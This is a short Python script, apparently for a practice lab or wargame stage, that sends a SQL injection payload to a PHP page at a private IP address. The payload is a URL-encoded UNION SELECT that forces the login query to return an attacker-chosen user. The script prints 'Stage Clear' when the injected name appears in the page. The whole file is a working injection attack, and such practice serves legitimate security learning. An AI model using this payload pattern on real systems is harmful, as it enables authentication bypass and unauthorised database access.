import requests

URL = "http://192.168.81.129/sqli/sqli2.php"
PAYLOAD = "?upw=1%27%20union%20select%201,%20%27upa%27,%203,%204;--%20-"

resp = requests.get(URL + PAYLOAD)


if resp.text.find('Hello! upa') > 0:
    print('Stage Clear')
else:
    print('Not yet')